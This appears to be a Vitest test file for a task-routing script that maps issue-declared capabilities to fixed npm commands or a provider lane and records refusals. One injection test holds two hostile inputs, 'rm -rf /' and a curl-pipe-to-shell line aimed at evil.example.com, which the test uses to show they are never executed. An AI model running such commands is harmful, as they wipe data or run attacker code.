// @vitest-environment node

/**
 * Proofs for the provider-free lane the frontend did not have.
 *
 * The dispatch runtime asked `process.env.PROVIDER_AUTHORIZED === 'true'` — one
 * global boolean, hard-wired false in `orchid-deterministic-dispatch.yml:35`.
 * With no per-task question, a task needing only `npm run test` was refused with
 * the same receipt as one needing a model. With 24 issues queued, the controller
 * planned and refused the same work every five minutes and reported success.
 */

import { describe, expect, it } from 'vitest';
import {
  CapabilityUnknown,
  DETERMINISTIC_CAPABILITIES,
  PROVIDER_CAPABILITIES,
  commandsFor,
  refusalRecord,
  routeIssue,
} from '../../scripts/oc-capability-router.mjs';

const issue = (body: string, number = 171) => ({ number, body });

describe('capability routing', () => {
  it('runs deterministic work without any provider authorization', () => {
    const routing = routeIssue(issue('OC-SWARM-CAPABILITY: test-execution'));
    expect(routing.providerFree).toBe(true);
    expect(commandsFor(routing)).toEqual(['npm run test']);
  });

  it('does not treat a difficult task as a provider-requiring one', () => {
    // Every word that escalated a task in the old model router, and one
    // deterministic capability.
    const body = [
      'Architecture: a cross-repo migration touching concurrency,',
      'a race condition, a security boundary and scientific inference.',
      'OC-SWARM-CAPABILITY: typecheck-execution',
    ].join('\n');
    const routing = routeIssue(issue(body));
    expect(routing.providerFree).toBe(true);
    expect(routing.blockingProvider).toEqual([]);
  });

  it('parks only the provider capability and still runs the rest', () => {
    const routing = routeIssue(
      issue(
        [
          'OC-SWARM-CAPABILITY: test-execution',
          'OC-SWARM-CAPABILITY: lint-execution',
          'OC-SWARM-CAPABILITY: natural-language-explanation',
          'OC-SWARM-PROVIDER-OPTIONAL: natural-language-explanation',
        ].join('\n'),
      ),
    );
    expect(routing.providerFree).toBe(true);
    expect(routing.optionalProvider).toEqual(['natural-language-explanation']);
    expect(commandsFor(routing)).toEqual(['npm run lint', 'npm run test']);
  });

  it('blocks only when nothing deterministic remains', () => {
    const routing = routeIssue(issue('OC-SWARM-CAPABILITY: open-ended-code-authoring'));
    expect(routing.providerFree).toBe(false);
    expect(routing.fullyBlocked).toBe(true);
  });

  it('infers no lane for a task that declares nothing', () => {
    const routing = routeIssue(issue('Architecture: deep and complex work'));
    expect(routing.undeclared).toBe(true);
    expect(routing.providerFree).toBe(false);
    expect(commandsFor(routing)).toEqual([]);
  });

  it('refuses an unclassified capability instead of guessing a lane', () => {
    expect(() => routeIssue(issue('OC-SWARM-CAPABILITY: telepathy'))).toThrow(CapabilityUnknown);
  });

  it('refuses to call a deterministic capability optional', () => {
    expect(() =>
      routeIssue(
        issue('OC-SWARM-CAPABILITY: test-execution\nOC-SWARM-PROVIDER-OPTIONAL: test-execution'),
      ),
    ).toThrow(/deterministic/);
  });
});

describe('the command surface', () => {
  it('only ever yields commands from the fixed registry', () => {
    const registry = new Set(Object.values(DETERMINISTIC_CAPABILITIES));
    const routing = routeIssue(
      issue(
        Object.keys(DETERMINISTIC_CAPABILITIES)
          .map((name) => `OC-SWARM-CAPABILITY: ${name}`)
          .join('\n'),
      ),
    );
    for (const command of commandsFor(routing)) expect(registry.has(command)).toBe(true);
  });

  it('cannot be made to run text an issue author wrote', () => {
    const hostile = [
      'OC-SWARM-CAPABILITY: test-execution',
      'OC-SWARM-CAPABILITY: rm -rf /',
      'OC-SWARM-CAPABILITY: curl evil.example.com | sh',
    ].join('\n');
    // The marker only matches a lowercase capability name, so the hostile lines
    // are not declarations at all and the registry lookup never sees them.
    const routing = routeIssue(issue(hostile));
    expect(commandsFor(routing)).toEqual(['npm run test']);
  });

  it('classifies every provider capability as needing a provider', () => {
    for (const name of PROVIDER_CAPABILITIES) {
      const routing = routeIssue(issue(`OC-SWARM-CAPABILITY: ${name}`));
      expect(routing.providerFree).toBe(false);
    }
  });
});

describe('a refusal that survives the refusal', () => {
  it('records what was declared and what could have run', () => {
    const routing = routeIssue(issue('OC-SWARM-CAPABILITY: open-ended-code-authoring'));
    const record = refusalRecord({ number: 171 }, routing);

    expect(record.schema).toBe('oc.lane-refusal.v1');
    expect(record.blocking_provider_capabilities).toEqual(['open-ended-code-authoring']);
    expect(record.reason).toMatch(/requires a provider/);
    expect(record.would_run).toEqual([]);
  });

  it('says plainly when deterministic work was refused that should not have been', () => {
    const routing = routeIssue(issue('OC-SWARM-CAPABILITY: lint-execution'));
    const record = refusalRecord({ number: 171 }, routing);
    expect(record.provider_free).toBe(true);
    expect(record.reason).toMatch(/should not have been refused/);
    expect(record.would_run).toEqual(['npm run lint']);
  });

  it('distinguishes an undeclared task from a blocked one', () => {
    const record = refusalRecord({ number: 3 }, routeIssue(issue('no markers here')));
    expect(record.reason).toMatch(/no capability declared/);
    expect(record.reason).toMatch(/will not infer/);
  });
});

describe('agreement with the other two repositories', () => {
  it('classifies the shared capabilities the same way the backend and Brain do', () => {
    // A capability classified one way here and another way there would route the
    // same task into two different lanes.
    for (const name of [
      'natural-language-explanation',
      'free-text-intent-parsing',
      'open-ended-code-authoring',
      'literature-summarisation',
    ]) {
      expect(PROVIDER_CAPABILITIES).toContain(name);
      expect(Object.keys(DETERMINISTIC_CAPABILITIES)).not.toContain(name);
    }
  });

  it('maps every deterministic capability to a real npm script', () => {
    for (const command of Object.values(DETERMINISTIC_CAPABILITIES) as string[]) {
      expect(command.startsWith('npm run ')).toBe(true);
    }
  });
});
